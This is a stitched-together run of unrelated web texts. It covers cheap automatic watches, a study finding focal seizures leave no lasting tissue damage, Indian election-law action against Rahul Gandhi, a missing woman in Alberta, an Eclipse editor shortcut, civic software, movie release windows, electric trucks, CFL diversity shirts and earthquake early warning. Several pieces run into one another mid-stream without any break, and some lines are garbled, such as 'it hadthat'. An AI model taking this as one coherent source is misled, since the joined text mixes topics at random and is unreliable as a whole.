Full skeleton can get a little much. A well placed cut out window showing the inner workings of your time piece is welcomed by some. Bulova's 96A111 has been hitting that sweet spot with a nicely dressed up look for years. 43mm so it is a bit on the big side. Has more flash to it than the Amazon pics. Japanese movement. Extremely well reviewed. Photo Credit: Ernesto Castellanos
The dynamite dress watch: Orient Bambino – $182.00 w/ WINTER2012
It's a relatively recent addition to the Orient lineup (did it come out in late 2011? Early 2012?), and it might eventually displace the Mako dive watch as the brand's flagship. Heirloom looks without the I-need-an-inheritance price. Domed crystal is a well executed throwback style, and the 41.5mm case is the perfect width for most. More here.
The Now in Mid Size: Maratac Pilot – $239? (Sold Out for now)
Of course it's sold out. But at least they've made a mid-size in the new style for 2013. The regular, 46mm Maratac Pilot is BIG (full review over here) so plenty have been waiting on a mid-size. It's coming, or, it was here and now gone, but it exists. Maybe. Somewhere. Still wish they'd make one around 41 or 42 mm since the mid sized option is a smaller 39mm in diameter.
In this world of vanity sizing, an XL shirt means it's going to fit a human of epic proportions. So you'd think the Orient Mako XL would be the size of a grandfather clock. Not so. It's certainly on the larger size at 44.5 mm in diameter, but it wears a bit smaller. It doesn't swallow up an average sized wrist, and it should be proportional for you big fellas. Available in a few different dial and bezel combos. Standby for a full in person and giveaway in the not too distant future.
All hail the Hammy Khaki Field. If you work in a place where wearing a suit would get you funny looks, yet you love a well built automatic, then this Hamilton, while pricey, is worth saving up for. Not huge, but handsome as hell. Photo Credit: Robert Donovan
The Nearly New: Christopher Ward “Nearly New” Watches – $300 – $500ish
These only come around once or twice a year, but if you get on their mailing list, you can get access to “nearly new” watches at a bit of a discount. For example, during the last sale, a Nearly New C60 Trident was going for $385 and it wasn't final sale. When it showed, it wasn't for me (a bit smaller than expected) and they were good enough to reimburse me to ship it back to the U.K. Great customer service out of them, and the watch was stunning in person.
The New Success Story: Anstead Oceanis – $499.00
He came, he kickstarted, he… well he actually succeeded. Kickstarter has had a few recent stumbles in the world of style, but the Anstead Oceanis doesn't seem to be one of them. Created by a Navy Veteran and the project caught fire. There was a few month delays in delivery, but he did deliver and has launched a regular retail site. Runs on the new 24-Jewel Sekio NH36ª. An impressive 300m water resistance. One mean looking bezel. Was a $250 reward and now $499. (Shakes fist at sky with regret)
Careful, the white dial option was just being fulfilled by Amazon, but have since gone to a third-party only (the more expensive black dial is still being fulfilled by Amazon). Hard to find, but if you can get your hands on one… it'll likely knock your socks off. The step up stainless case hints at art deco, while the white dial and hands are razor sharp. Runs on the relatively new Swiss Made C01.211 movement. Pushers are crisp and snappy. Sapphire Crystal. Exhibition case back. A perfect for plenty 42.5mm in diameter. Up there in price, but finding a Swiss Made chronograph with these kinds of looks for under $700 is no easy task.
The Rose Gold 401K Killer: Hamilton Viewmatic – $604.00
Gaaaaaaahhhhhddamn.
What else? Anything that should be added to the list? Leave your favorite affordable automatic in the comments.
ARTICLE IN BRIEF
Seizure activity alone does not promote the expression of brain injury biomarkers, at least in type II focal cortical dysplasia (FCD II) or cryptogenic disease, researchers reported. The findings dispel the long-held belief that recurrent focal seizure activity, over time, can damage tissue away from the primary site.
An analysis of brain tissue from patients with recurrent seizures due to type II focal cortical dysplasia or cryptogenic disease found no sign of cell loss, gliosis, or inflammation — all biomarkers indicative of brain damage.
The findings appear to dispel the long-held belief that recurrent focal seizure activity, over time, can damage tissue away from the primary site.
“Despite thousands of focal seizures over a lifetime, cortical areas involved in seizure generation showed no abnormal structural changes,” said Rita Garbelli, PhD, a researcher with the division of clinical epileptology and neurology at the Carlo Besta Neurological Institute in Milan, Italy.
Dr. Garbelli and her colleagues evaluated expression of brain injury biomarkers in 20 patients with a history of frequent seizures and drug-resistant focal epilepsy. None of the biomarkers revealed abnormal tissue changes, according to the retrospective study, which was published in the August 30 issue of Annals of Neurology.
“The public and a large majority of neurologists, and even epileptologists, believe that seizures damage the brain, despite the fact that there is no scientific evidence that they cause structural changes in brain matter,” she told Neurology Today.
The findings suggest that seizure activity alone does not promote the expression of brain injury biomarkers, at least in the type II focal cortical dysplasia (FCD II) or cryptogenic disease, she noted.
The knowledge that seizures do not alter the structure of the brain in this specific form of epilepsy, and maybe others, may reduce patient concerns associated with seizures, especially for patients with a long history of recurrent seizures, Dr. Garbelli said.
About 30 percent of epilepsy patients do not respond to pharmacological therapy, and 30 percent of these can be candidates for surgery, she explained. A favorable seizure outcome strictly depends on the exact localization and removal of the epileptogenic brain area.
“In patients who are seizure-free after surgery, antiepileptic drugs can be gradually withdrawn, with important implications for the social life, quality of life and productivity, and for the costs charged to the health care system,” she noted.
STUDY METHODS, RESULTS
The researchers examined tissue samples collected from the patients during surgical resection for drug-resistant epilepsy. Among the patients, 16 had FCD-II, including 11 with type IIb and five with type IIa disease, with disrupted cortical lamination, dysmorphic neurons, and balloon cells. The other four subjects had cryptogenic epilepsy with no signs of structural lesions.
There were no signs of structural lesions on imaging or by neuropathological investigation.
The mean age of seizure onset in the FCD-II patients ranged between one and 34 years, and the frequency of seizures at the time of surgery ranged from one to 300 per month (with a mean of 80 ± 94 per month). Duration of disease ranged from one to 40 years (mean 18 ± 14 years). For cryptogenic patients, the mean onset age ranged from eight to 39 years, with seizure frequency ranging from of two to five per month (mean 4 ± 1), and average epilepsy duration of four to 28 years (mean 17 ± 10).
Using immunohistochemical analysis, the investigators looked for signs of damage in expression patterns of glial, neuronal, and inflammatory molecules in the core of the lesion, at the FCD boundary, and in the adjacent area. While they found signs of astroglial and microglial activation, as well as reduced neuronal density, perivascular CD3-positive T-lymphocyte clustering, and fibrinogen extravasation, in the core of FCD-II lesions, no pathological immunoreactivity was found anywhere outside the core or in any of the cryptogenic specimens.
The findings do not contradict substantial evidence that seizures can produce structural changes in the limbic system, nor do they exclude the possibility that seizures may induce functional changes, but these are not associated with the standard neuropathological changes typically associated with brain injury, Dr. Garbelli told Neurology Today.
“In cryptogenic cases it is obvious that a functional alteration not associated with the analyzed damage biomarkers must be present in the epileptogenic zone. Countless possible abnormalities could be involved in this malfunction, and whether these are secondary to seizure activity is not defined.”
Additional research is needed to identify the pathogenic elements that generate seizures in such patients and in nonlesional epileptogenic zones, said Dr. Garbelli, as well as subtler morphological alterations or functional alterations.
“This and other research on the correlation between invasive recordings and neuropathological evaluation strongly suggest that the cortical tissue around the FCD lesional core is locally recruited in the generation of seizure activity.”
Markers of tissue damage, including neuronal paucity, extended gliosis, presence of inflammatory molecules/cells, and protein extravasation, were all detectable in the lesional FCD area, particularly in the FCD-IIb subtype. However, these were not seen in adjacent perilesional/nonlesional areas or in cryptogenic tissue. “This suggests that injury biomarker expression is an intrinsic feature of the focal cortical malformation and is not triggered by chronic seizure activity per se.”
EXPERT COMMENTARY
Jeffrey L. Noebels, MD, PhD, professor of neurology, neuroscience, and molecular and human genetics, and vice chair for neurological research at Baylor College of Medicine in Houston, TX, told Neurology Today that the findings are in stark contrast to the widely known and profoundly brain-damaging effects of prolonged generalized status epilepticus.
“It is surprisingly unclear whether brief, intermittent focal neocortical seizures arising from a small patch of developmentally disorganized neurons induce further local neuronal damage beyond the irritated discharge zone, and should therefore be considered actively ‘epileptogenic,'” he told Neurology Today.
Local expansion of these pharmacologically-resistant lesions could aggravate the course of the disorder, necessitating their earliest possible removal, he noted.
“The authors present a convincing analysis. These welcome and seminal findings may reassure epileptologists and their patients during the systematic and sometimes lengthy search for effective management of these cases. However, as the authors point out, the results cannot be extrapolated to other brain regions or seizures of alternate origins.”
Excitotoxic and inflammatory damage to neighboring neurons and synapses can both create, and arise from, a wide biological spectrum of microcircuit and microvascular dysfunction, including some of genetic origin, he noted.
“Some functional pathology may be visible only through the oscilloscope, not the microscope. A similar analysis of many other types of epileptic foci will be needed to better understand how, where, and when cell death is promoted by excessive discharge activity in neocortical circuitry. In FCD-ll lesions, the pathology drives the EEG, and not the other way around.”
Selim R. Benbadis, MD, FAAN, professor and director of the Comprehensive Epilepsy Program at the University of South Florida and Tampa General Hospital, told Neurology Today he also welcomed the findings.
“Patients always ask about this, so it is very helpful to have data like these. I usually tell them that it depends, but that partial seizures do not cause irreversible damage,” he told Neurology Today, adding that he suspects the findings are probably true for all focal epilepsies.
“The findings are also important because many patients may be over-treated,” he said. “This should help provide a more common sense approach in treating such patients.”

The general perception of the Democratic People's Republic of Korea (DPRK) is often shaped by one of two familiar scripts. On one hand, tall tales of unicorns and Kim Jong-Il's golfing prowess have long made the hermetic kingdom the butt of international jokes; on the other hand, well-documented cases of militaristic belligerence, the tight control of society and an extensive network of gulags has combined to paint a truly tragic picture.
But no nation on earth can be this easy to pigeonhole, even the DRPK. Unbeknownst to many, the nation opened its doors to tourism years ago and welcomes several thousand visitors annually. While it is true that these tours are scripted and tightly controlled, Enter Pyongyang, an amazing new video by JT Singh and Rob Whitworth, captures the vitality of North Korea's capital, a place clearly struggling to juggle an adherence to traditional Korean values and the policy of juche (self-reliance) with a more modern and global approach to its affairs.

Congress attacks EC over 'double standards,' seeks action against BJP over poll violations The Congress on Wednesday hit out at the Election Commission of India after it ordered action against Rahul Gandhi and TV channels airing his interview for violating the Model Code of Conduct in force in Gujarat.
received reports and complaints +
NEW DELHI: The Election Commission on Wednesday ordered filing of an FIR against Congress president Rahul Gandhi for giving an interview to a TV channel in Gujarat in violation of the 48-hour ban on campaigning, as well as against all TV channels that telecast the interview across districts going to the polls on Thursday.The EC, in a notice sent to Rahul Gandhi, said that the interview fell within the definition of "election matter" under Section 126(3) of the Representation of the People Act, 1951, the display of which "within 48 hours ending with the hour fixed for conclusion of poll, amounts to violation of the prohibition contained in Section 126(1)(b) of R P Act". It further said that the Congress chief, by giving such interview and its display on TV channels on Wednesday, had "prima facie violated...provisions of para 1(4) of the model code of conduct, Section 126(1)(b) of the R P Act and Election Commission's lawful instructions in this regard".While seeking an explanation from Rahul Gandhi for violation of the model code latest by December 18, the EC separately issued a direction to the Gujarat chief electoral officer asking him to initiate action against all those who had violated the aforesaid provisions."The Commission hereby directs that necessary action for violation of the aforesaid Section 126(1)(b) of the Representation of the People Act, 1951, may be initiated by filing of FIR against those who have violated the above-mentioned provisions immediately in areas which are going to the poll tomorrow, i.e, 14th December, 2017," EC said in a communication to the Gujarat CEO.An EC official confirmed to TOI that the term "those" in the above paragraph was in reference to both the TV channels that aired Rahul Gandhi's interview in the poll-bound districts and Rahul Gandhi himself.This is made clear by the notice served on Rahul Gandhi, where EC says that "by giving such interview and its display on TV channels on 13.12.2017, you have, prima facie, violated...para 1(4) of the model code of conduct, Section 126(1)(b) of the R P Act, 1951, and Election Commission's lawful instructions in this regard."As per Para 1(4) of model code, all parties and candidates must avoid scrupulously all activities which are 'offences' under the election law. Further, Section 126(1)(b) of R P Act prohibits display to the public of any 'election matter' on TV, during period of 48 hours ending with hour fixed for conclusion of poll.As per EC instructions brought to the notice of all registered national parties, "no matter related to election can be shown or displayed in theatres, TV channels or electronic media during the said period of 48 hours".The Commission on Wednesday said it hadthat some TV channels had displayed interview given by the Congress president where he is talking about Gujarat elections. Terming telecast of interview as “display of election matter” in violation of the 48-hour ban in force for Phase-2 polling, the Election Commission on Wednesday directed the state chief electoral officer to initiate filing of an FIR against the said channels as well as Rahul Gandhi under Section 126(1)(b) of Representation of the People Act (R P Act), 1951.The Commission also asked the TV channels “which are violating the provision of Section 126(1)(b) by displaying said election matter in Phase 2 districts in Gujarat to forthwith stop the display of such matter”.

HANCOCK, N.Y. — Four years ago, I traded a job in a big, noisy office in Washington, D.C., for one in a little storefront on the main drag of a town on the banks of the Upper Delaware River in the Catskills. My new job included protecting one of the finest wild trout fisheries on the East Coast, but I didn't start by meeting lawmakers and writing letters and rallying support. That came later. First, I fished.
For two full months in the spring of 2013, I waded and floated the river, fishing for wild browns and rainbows in the company of a band of guides and anglers who dedicate no small portions of their lives to the pursuit.
It did not take me two months to learn why this place is so special to so many. It's not just a pretty river meandering through beautiful countryside. It's a river with big, hard-pulling wild trout, native born and discerning enough to challenge even the most experienced angler. You start catching fish like these, and you'll never want to leave.
When I returned to reality, I got to work. We've had some successes in protecting the river. But the Upper Delaware is a fragile ecosystem, and now it is threatened by a bitter dispute between New Jersey and New York City over water availability, and how much should be released into the river for the fishery and downstream states from reservoirs that provide water to the city.
The body found near Rocky Mountain House on Monday has been identified as that of Anina Hundsdoerfer, say police.
An autopsy completed on Thursday confirmed the identification. EPS detectives say there were no signs of foul play.
They are not treating the death as criminal.
The body was found by RCMP search teams in a forested area just off the road several kilometres north of where Hundsdoerfer's car was found in March.
Hundsdoerfer was reported missing on March 23 after she went into work in downtown Edmonton, leaving behind her phone and identification.
Alberta Fish and Wildlife officers found her 2005 Toyota Echo parked along the side of Highway 734 near Nordegg two days later.
The car was locked and there were no signs of foul play.
RCMP and EPS have been coordinating efforts to find the missing woman, conducting several searches of the area around where the car was found using RCMP dog teams.
Hundsdoerfer's friends also conducted their own search of the area, and posted signs with her picture in Nordegg and Rocky Mountain House.
In a message released through the police, Hundsdoerfer's family thanked the public for their search efforts.
Selecting strings is a common thing especially if you want to (a) extract a constant representing it, (b) replace the string with a message bundle key or (c) use it as a search term to look for the same string across the codebase. When refactoring, you'll sometimes want to delete a method or move it around, requiring you to select the entire method.
The problem is that selecting these can be slow. To select a string you'll typically move the cursor to the start of the string then select the string using the arrow keys or Ctrl+Shift+Right (select next word) repeatedly until you reach the end of the string which can be slow depending on the number of words in the string. The strategy for methods is similar, move to the start and select but using .
Eclipse has a keyboard shortcut called Select Enclosing Element to make this faster. It allows you to select entire strings from anywhere within the string and methods from anywhere within the method. A bonus is that you do the same thing no matter how big the string/method is.

How to select an entire string
To select an entire string, do the following:
Position the cursor anywhere inside the string or before or after the quotes. Press Alt+Shift+Up. This will select the entire string, regardless of how many words there are.
If the string spans multiple lines, press Alt+Shift+Up once more to select the string across lines.
See the video below for an example of how this works.
How to select an entire method
To select an entire method, do the following:
Position the cursor anywhere inside or at the start/end of the method. Press Alt+Shift+Up several times until the method is selected. Each time you press this key, Eclipse will select the enclosing element of the current selection. Often 4-5 times would be enough but sometimes you'll need up to 7. Not quite a single keystroke, but close enough since you're just repeating the same keystroke. If you've gone too far with the selection (ie. selected too much), you can press Alt+Shift+Down to take the selection one element back.
Here's a video with an example of both string and method selection. I select the string to extract a constant and select the method to move it down.
How does this make me work faster?
There is no doubt that selecting strings is faster than the old way (watch the video and see what I mean).
But you might ask how selecting methods is faster than the old way, considering that you have to press the key multiple times. Well, using the Select Enclosing Element technique, you always do one action repeatedly whereas the old method requires different actions depending on the context, eg. where you are in the method, how big the method is, where does it end (did you page down too far?). 90% of the time the former is faster than the latter.

Advanced engagement tools for city councils and modern interactive web sites for citizens are expensive to build and difficult to maintain. Most small cities and towns in Canada just don't have the resources to manage that kind of project, and so simply do without.
But Open North, a not-for-profit based in Montreal, is hoping to make those resources available to almost everyone and reduce the digital divide.
“How can we help citizens grasp what city officials are doing?” asks Ellie Marshall, Open North's communications manager, explaining the company's mission. “The idea is it'll be a tool kit.”
Right now, Open North offers four packages: Citizen Budget, MyCityHall, Open511 and Represent.
And prices for municipalities to sign on are remarkably reasonable.
“Our goal in every project we do is resuablity and scaleability” -Ellie Marshall
Citizen Budget, for example, is an interactive tool that allows anyone to take the seat as a city budget manager, deciding where cuts should be made and money spent. It's something big cities like Toronto and Vancouver have been doing for a couple of years, but now that tool is available to any town in the country.
“Pricing for that is scaled by population,” Marshall said. “The average 70,000 person city will cost about $4,000.”
The advantage for a city hall is they get to collect the data at the end of it. Which age group/gender/immigrants/area wants certain features in the budget? Where would these people cut? It allows an instant aggregate view of what citizens hope to see in a municipal budget.
The tool is hosted either on the city's website or, if they don't have the resources for that, could be hosted on Open North's website, too.
MyCityHall is a tool that allows citizens to get in touch with city councillors during debates, track motions as they move through the labyrinth that is city hall, and explains the entire process.
Open511 is an open standard that all cities can start using to track road events like accidents, construction, potholes and even stalled vehicles. That tool can easily interact with smartphone apps and mapping programs to route vehicles efficiently based on real-time data, something especially useful for emergency workers.
Represent mashes up municipal, provincial and federal data to instantly show people who their elected officials are at every level of government, what they're up to and how to get in touch with them.
But what makes Open North different than every other service provider is that each tool is open source, meaning other developers can take them and modify as much as they wish, and each tool is designed to be re-used.
“Our goal in every project we do is resuablity and scaleability,” Marshall said.
“If a municipality wants something additional built in, we'll work with them to do that,” she added. Then that extra functionality will be available for all future projects, too.
“We're in the development phase right now,” Marshall said. “We want you to be able to have search bar, enter your postal code and look at issues going on in your neighbourhood, or enter ‘community gardens' and we'll show you all the places that's being talked about in city hall.”
It's an ambitious project, that could finally make interactive government a reality for Canada's smaller cities and towns. Right now it's being rolled out in Montreal and Toronto as test markets.
From there, Open North hopes to be everywhere as a quiet, invisible, helper in the background of city life.

Paramount plans to cut down the wait between when a movie is released in theaters and when it's finally available to watch on demand. According to The Wall Street Journal, Paramount hopes to begin making all of its movies available to watch at home only two weeks after they leave most theaters. Two small films will be released this way this fall, and the studio reportedly intends to shift all films over to the advanced schedule later in the year.
Studios spend millions advertising their movies... and then don't let people see them
That may not sound like much, but it's potentially a big change from the status quo: for decades, studios have typically waited at least 90 days after a film's theatrical release before making it available on home media, often leaving a gap of a month or more. The intention was to drive viewers to the box office, but it's meant leaving a long window during which no one could actually watch the new movie.
"What other product creates its most attention at launch and then creates a significant period of time where the consumer can't acquire that product?" Rob Moore, Paramount's vice chairman, says to the Journal. Moore's quote basically speaks to all of the major issues at play here. Millions of dollars go into advertising a movie as it heads into theaters, and then that money has to be spent again to remind people of the movie once it's available at home. With this change, studios can use existing advertising to drive viewers to on demand options once they become available, which it clearly hopes will raise revenues. That could also help the studio make up money on a film that isn't performing as well as it'd like.
The existing release gap also creates other headaches for studios, like piracy. While making it briefly impossible to see a new movie may have once convinced people to catch it while it was in theaters, it's now more likely to have the effect of making people see where else they can find it. By removing most of the home release gap, Paramount may be able to reduce the number of viewers turning to piracy only because there's no way to pay.
The final 'Paranormal Activity' will be one of the first films with a short window
Even recently, a change like this is something that theater chains may have seemed deeply opposed to. But theater attendance is dropping, and Paramount is structuring a change in a way that's still giving big theaters a reason to advertise a film. The Journal reports that Paramount will share on demand and other digital revenue with theater chains, which could make up for any box office revenue this cuts out.
Shortening the release date for all of Paramount's movies will be a bigger move, and it's not entirely clear if it has the deals to make that happen just yet. The Journal says that Paramount has made deals for two movies right now and with only two theater chains. They're two of the biggest chains, however: AMC and Cineplex. That they're willing to sign on suggests that Paramount has worked this out in an appealing way, but the studio will have to get the other major chains to sign on if it wants to extend this practice to big-budget films, like Transformers, as the Journal says it intends to. Paramount has reportedly only spoken to those two chains so far, but it intends to offer the same deal to others.
Small distributors have already been moving up home releases
The two films that Paramount will start this process with are Paranormal Activity: The Ghost Dimension and Scout's Guide to the Zombie Apocalypse. These are both low-budget films, and it makes sense to test this new model on them. They're likely to have a smaller audience at the box office, so quickly turning around and marketing on demand sales could help boost their viewership. Larger films also run in theaters longer, so shortening the window may not have as much of an impact — in fact, in some instances, the shorter window may not be noticeable at all.
Paramount's plan to shorten the release window is big so far as big studios and big movies go, but it isn't entirely unprecedented. That's especially true when looking at its first two films. Indie distributors have already been releasing movies in theaters and on demand with only a small gap between them, if not simultaneously. It's essentially the same model, but possibly even more helpful since those distributors don't have the marketing budgets to create the same type of buzz that Paramount can.
That makes this move a step toward simultaneous theatrical and on demand releases, but only a small one. Studios are becoming more aware of how people want to watch movies — and with the money that studios are throwing behind their films, they need to do everything that they can to make sure people are interested and able to pay.
While all the attention is on Tesla Semi and other electric big rigs under development, smaller electric trucks are making it to market today.
After starting delivery in the US earlier this year, Daimler is now delivering all-electric trucks in Europe.
Mitsubishi Fuso Truck and Bus Corporation, a part of Daimler Trucks, is calling it the first “series production” of electric trucks.
Marc Llistosella, Head of Daimler Trucks Asia, explains:
“With the FUSO eCanter we are delivering the first all-electric truck in series production to our customers in Europe today. Over 90,000 kilometers of testing in everyday operating conditions secure that we hand over a reliable and economical vehicle to our customers. With the FUSO eCanter our customers now operate not only quietly and without locally emitted CO 2 , they also save money on operating costs. This is the future of urban distribution transport.“
The FUSO eCanter is meant for urban routes with a range of only 100 kilometers (62 miles) and a load capacity up to three and a half tons – depending on body and usage. The vehicle is powered by an electric powertrain with six high voltage lithium-ion battery packs with 420 V and 13.8 kWh each for a total of ~83 kWh of capacity.

TORONTO — Commissioner Randy Ambrosie said this weekend's violent protests in Charlottesville, Va., prompted the CFL to unveil a new line of T-shirts Sunday in Regina rather than later this fall.
The T-shirts feature the words “Diversity is Strength” on the front and “A league of what we're made of,” on the back with surnames of many current and former CFL players and personnel. They were worn by B.C. and Saskatchewan players and coaches prior to the Roughriders' 41-8 win at Mosaic Stadium, including Lions head coach/GM Wally Buono, whose name appears on the back.
The T-shirts were originally scheduled for launch this fall as part of Canada 150 celebrations. But Ambrosie said the decision was made Saturday to unveil them in Regina after one woman was killed and nearly 20 others injured in Charlottesville when a car plowed through a group protesting a white supremacist rally.
“It's not a political message,” said Ambrosie, a former CFL player who was appointed commissioner last month. “It was just an acknowledgment that at a time when the world is being pulled apart we can do something to bring it back together and remind people how important coming together is and how diversity can play a big role in being bigger, stronger, faster, better.
“I just felt in a moment when there might be a focus on negativity that there was time to refocus on the positive aspects of diversity. All you have to do is look at the names on those T-shirts and recognize these were players from every race, colour and creed who came to the league and were given an opportunity and became stars and Canadian icons. It's not at all political, it's just who we are and really worthy of celebration.”
Ambrosie said other CFL teams will don the T-shirts this week.
“We've already had those requests coming in . . . the teams are all getting excited about it,” he said. “I'm happy to say it looks as though this is being embraced by our teams, by the Canadian public.
“It's something we should just continue to celebrate because it's so much a part of being part of the CFL and being Canadian.”
In Calgary, Stampeders head coach Dave Dickenson, who's from Great Falls, Mont., says he was glad to see the initiative.
“I'm not into politics too much. I think we just should be treated as humans,” Dickenson said. “We're all in the same boat. We're all working hard for the same goals. I don't understand what's going on except that I want to treat people fairly and everybody's the same in my mind.
“Just look at the Canadian content in our league, where they're from. I think Canada is quite diverse. I like being up here. They adopted a Montanan so I feel like that's a good thing. I really like being in Canada. I feel it's quite diverse and a place I feel safe.”
The CFL plans to make the T-shirts available for sale to fans sometime later this week. Ambrosie said the league is looking at dedicating a portion of the proceeds to Purolator Tackle Hunger as well as the CFL Alumni Association.
“I think this is a perfect way to reinforce the Canadian Football League and reinforce the message of being Canadian,” Ambrosie said.
Ambrosie said the feedback he received from Lions and Riders players and officials about the T-shirts was positive.
“Everywhere I turned, the people wearing T-shirts were smiling and I think they were wearing them proudly,” he said. “While I can't point you to a survey or scientific test that would prove the point, I think everyone who put one of them on, my feeling was they were just incredibly proud to be part of a positive message.”
And that included Ambrosie, who wore a T-shirt with Riders receiver Chad Owens in a picture that appeared Sunday on Twitter.
Thank you #CFL fans! Due to overwhelming support a limited run of “Diversity is Strength” shirts will be made avail… twitter.com/i/web/status/8… —

“I'm a double XL so my message was even bigger,” Ambrosie said.
Nintendo has stressed the importance of catering to all audiences through its games. In an interview with US Gamer, Nintendo designer Katsuya Eguchi explained that the company wants their projects to speak to a wide variety of players. To make this possible, Nintendo developers consist of experienced and lesser-skilled players alike who work toward settling balanced difficulty levels.
“In terms of games like Mario, an action game, a lot of audiences are obviously very good at action games, but there are also more inexperienced players, like children, who still enjoy playing Mario,” said Eguchi. “There's a varying range of skill levels. To match that kind of target audience, we make sure that our team setup matches that. If we have only skilled players making the game, we end up having a game where the difficulty level is a little high, or the problem-solving involved is very challenging. By including people who may not play games as much, or are inexperienced in gaming, having them as part of the dev team makes us realize some things that we maybe wouldn't have if we only had core gamers making the game.
“And that's just one aspect. There are lots of different perspectives that go into creating even a single title. In that sense, it's very beneficial to have diversity in our staff, and that's something I like to keep at the forefront of my mind as we build toward other projects.”

The United States will be hit by a major earthquake causing hundreds of fatalities within my lifetime. Whether it will be in 20 years, 2 years, or tomorrow, we do not know. Such an event will prompt the country to implement a public earthquake early-warning system, giving people seconds or minutes to prepare for the shaking. Rather than waiting until the next big quake galvanizes political action, I believe that we must build an alert system now.
Earthquake early-warning technology is proven. Japan leads the way. When the magnitude-9 Tohoku-Oki earthquake hit the northeast of the country in March 2011, an automatic warning was issued within seconds. Trains stopped, students took shelter under desks, sensitive manufacturing equipment was paused and hazardous chemicals were isolated. Lives and money were saved. China, Taiwan, Mexico, Turkey and Romania also issue earthquake alerts.
The US public deserves access to warnings too. For the past 2 years, California has run a successful demonstration system — providing seismic alerts to 36 organizations, including the Bay Area Rapid Transit rail network. Now, the system must be made more robust and rolled out to the public, first across the West Coast and then nationwide. The benefits for security, business and science are manifold.
The cost of an initial West Coast system is reasonable: US$120 million for the first 5 years to build and operate it, and a further $16 million a year to run it. This is roughly twice the current earthquake-monitoring budget for the region. Private enterprise could deliver the alerts and tailored services. Seismology would also benefit from the hundreds of extra sensors that would need to be installed along high-hazard faults — those most likely to slip.
The main obstacle is political will. Politicians, business leaders and agency administrators need to recognize the significance and urgency of seismic risk and implement an early-warning system before the next big quake costs lives. Other regions, including Europe, should follow.
Inevitable hazard
The probability that a major earthquake will hit the western United States in coming decades is high. California has a 99% chance of experiencing a quake of at least magnitude 6.7 (the size of the 1994 Northridge earthquake near Los Angeles) in the next 30 years. Both San Francisco and Los Angeles have a two-in-three likelihood of such an event. There is a 50% chance that the next big Bay Area quake will be on the Hayward Fault, which is situated about 500 metres away from the seismological laboratory at the University of California, Berkeley, where I work.
The Pacific Northwest region must be prepared for even bigger earthquakes, measuring up to magnitude 9 — similar to the one that hit Japan in March 2011. The hazard across the rest of the United States is lower, but damaging earthquakes can also occur all the way to the East Coast, as illustrated by the August 2011 Virginia quake of magnitude 5.8 that rattled Washington DC and New York.
The first line of defence in the United States is a robust building code to prevent structures from collapsing. But now, the information revolution allows us to develop real-time responses to minimize casualties and damage. When seismic sensors pick up the first vibrations of a rupturing fault, automatic alerts can be issued within seconds to give people up to 5 minutes to react, depending on their distance from the epicentre1.
Japan has pioneered such systems since the 1995 Kobe earthquake, which killed more than 6,000 people. The government invested billions of yen in seismic and geodetic networks to detect quake signals. In 2004, the Japan Meteorological Agency tested a limited earthquake-warning system. It delivered its first alert in 2005, and in 2007 the system went national and public. The first true test came in the Tohoku-Oki earthquake. Sendai, the closest major city to the epicentre, received a 15-second warning.
California's demonstration system, ShakeAlert2, has been operating since 2011 but is yet to go public. Using existing seismic sensors, it detects earthquakes daily and, when magnitudes exceed 2.5, issues alerts to a limited group of organizations mainly involved in transport, manufacturing and emergency response. It is largely a public-sector and academic enterprise: a collaboration that includes the California Integrated Seismic Network, with researchers and funding provided by the University of California, Berkeley, the California Institute of Technology in Pasadena, the US Geological Survey (USGS), the Southern California Earthquake Center and the Swiss Federal Institute of Technology in Zurich. In 2012, the scheme expanded to include the Pacific Northwest, adding the University of Washington in Seattle, and gained support from the Gordon and Betty Moore Foundation, a private grant-making organization in Palo Alto, California.
Although the California system has not yet been tested by a large earthquake, it successfully gave organizations in Pasadena a 5-second warning of ground shaking for a magnitude-4.2 earthquake in September 2011. In the San Francisco Bay Area, several small (magnitude-3) earthquakes located close to the epicentre of the 1989 Loma Prieta quake were detected, and alerts were provided around 20 seconds before peak ground motion in San Francisco, Oakland and Berkeley — illustrating what would be possible in a repeat of the devastating 1989 quake.
The detection algorithms have performed well so far, with few false alerts and no cases of small earthquakes being misclassified as large, dangerous ones. But before the California system can be trusted to go public, it needs more monitoring stations (using both seismic and Global Positioning System (GPS) techniques), more reliable communications and testing, multiple data paths and round-the-clock daily support. The infrastructure must be made resilient to hard shaking, to ensure that the system stays online during a big quake. More seismic and GPS stations will produce faster alerts in some regions and allow tracking of large-magnitude events as they tear along active faults.
Users can decide on the thresholds for alerts and choose whether they want to hear about only the big quakes that will cause damage, or all those that are felt. But the mechanisms to deliver the alerts in the United States — through smartphone and computer apps, television and radio — remain to be developed.
Business boon
A public–private partnership is the most effective way to disseminate the warnings, as in Japan. There, the public sector pays for the installation and long-term operation of geophysical networks to detect earthquakes and generate basic alerts. The private sector enhances and delivers the alerts, and provides support and risk-reduction expertise to the public and to businesses.
The benefits for business are threefold. First, commercial opportunities will be created. Apps will raise the alert on mobile phones, count down the time until shaking and provide location-specific instructions of what to do: for example, get under the table, exit the building or remain inside the steel-framed, glass-clad skyscraper. Self-driving cars will slow and stop. Manufacturing plants, petrochemical facilities and biotechnology companies will need other services, including determination of money-saving actions, appropriate thresholds of when actions should be taken and devices to implement them.
Second, financial losses will be reduced. After two damaging earthquakes in 2003 caused $15 million in losses at Oki Electric Industry, a chip manufacturer in Miyagi prefecture, Japan, the company spent $600,000 on an early-warning system and improvements to its buildings. In two similar earthquakes that followed, its resulting losses fell to $200,000 because machine damage and chemical spills were reduced.
In California, the Bay Area Rapid Transit system has implemented an automated train-braking mechanism that is triggered by earthquake early warnings. It takes 24 seconds to bring a train travelling at 112 kilometres per hour (70 miles per hour) to a stop. During peak commuting times, about 64 trains are in operation, each carrying around 1,000 passengers, and up to 45 trains travel at 112 kilometres per hour at any one time. Even one derailment at such a speed would be devastating.

Third, the recovery time for businesses is reduced. With its warning system installed, Oki's fabrication plant was closed after the earthquakes for just a few days, rather than for weeks. Minimizing damage to trains and tracks will result in faster resumption of service, which in turn supports the restart of regional businesses after a quake.
Seismology will benefit from the improved instrumentation. The 2011 Tohoku quake — the fourth largest since 1900 — yielded scientific advances because it occurred in one of the most densely instrumented regions in the world3–9. This extreme event tested the limits of early-warning systems. The size of the earthquake and the area affected were underestimated, and as a result, improvements to observational arrays are being made. Fast and accurate GPS sensor networks are needed to detect ground surface deformation, and ocean-floor observatories could closely monitor undersea faults.
Tracking fault motion in real time is key to making accurate shaking predictions, avoiding the underestimation that occurred in Japan's 2011 quake. To improve estimates of earthquake strength from the first signals, my research group is exploring how kilometre-scale seismic arrays can be deployed and tuned to track the progression of large fault ruptures.
In the future, the accelerometers that are embedded in smartphones and computers could provide a source of shaking data, thus boosting the number of magnitude sensors by thousands10.
